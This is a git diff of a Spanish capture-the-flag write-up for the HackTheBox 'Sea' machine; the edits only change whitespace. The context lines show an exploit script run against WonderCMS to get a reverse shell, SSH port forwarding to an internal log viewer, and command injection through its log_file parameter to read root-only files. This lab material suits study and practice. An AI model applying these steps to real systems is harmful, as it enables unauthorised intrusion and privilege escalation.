@@ -211,7 +211,7 @@ python3 exploit.py "http://sea.htb/wondercms?page=index.php" 10.10.16.76 1234
 6. Esperaremos con el puerto aun en escucha, mientras la pagina hace las solicitudes del archivo zip y ejecuta el rev.php.
 7. Es importante no detener la ejecución del script hasta que tengamos acceso a la shell.
 
-El script ejecutado al 100% se vera de la siguiente manera:
+El script ejecutado al 100% se vera de la siguiente manera:  
 ![Page](/assets/img/sea/exploit.png)  
 
 ---
@@ -287,7 +287,7 @@ ssh -L 8081:localhost:8080 amay@10.10.11.28
 ```
 `-L` Señala a nuestro puerto 8081 como el puerto 8080 maquina victima de esta forma podremos acceder al de manera local al servicio interno que la misma.
 
-Una vez accedemos a la dirección `127.0.0.1:8081` nos pedirá unas **credenciales**, que son las misma que usamos para acceder como el usuario amay; y observaremos la siguiente interfaz:
+Una vez accedemos a la dirección `127.0.0.1:8081` nos pedirá unas **credenciales**, que son las misma que usamos para acceder como el usuario amay; y observaremos la siguiente interfaz:  
 ![Page](/assets/img/sea/logsystem.png)  
 En esta interfaz podremos listar el contenido de ciertos **logs**, archivos que registran cada petición hecha al servidor. Por lo que para ver como funciona lo interceptaremos la petición que realiza el botón `Analyze` con la aplicación **`BURPSUIT`**. Debemos recordar
 De no conocer como configurar **BurpSuit** visitar el siguiente enlace a la pagina oficial: [PortSwigger](https://portswigger.net/burp/documentation/desktop/getting-started)  
@@ -298,10 +298,14 @@ Una vez interceptado observamos la siguiente petición vía **POST**
 Vemos que mediante el parámetro **log_file** la pagina hace una petición que imprime el contenido de la ruta: `var/log/apache2/access.log`
 Ruta que no es accesible por un usuario sin privilegios, por lo que concluimos que la pagina ejecuta dicha instrucción como **root**.
 
-Con esta información probamos listar el contenido de diferentes archivos concatenado la impresión del **log** con otras instrucciones desde el modo **Repeater** de BurpSuit. Consiguiendo finalmente la Flag de root al imprimir la ruta `/root/root.txt`.  
+Con esta información probamos listar el contenido de diferentes archivos concatenado la impresión del **log** con otras instrucciones desde el modo **Repeater** de BurpSuit. Consiguiendo finalmente la Flag de root al imprimir la ruta `/root/root.txt`.
+
 ![Page](/assets/img/sea/rootflag.png)  
+
+
 Por ultimo nos daremos cuenta que podemos ejecutar ciertos comandos como root, pero en mi caso no encontré la forma de establecer una ReverShell privilegiada.  
 ![Page](/assets/img/sea/comandexe.png)  
+
 ---
 
 > **GG!** Espero hayan disfrutado siguiendo de este WriteUp y que hayan aprendido los conceptos aplicados. Buena suerte :)
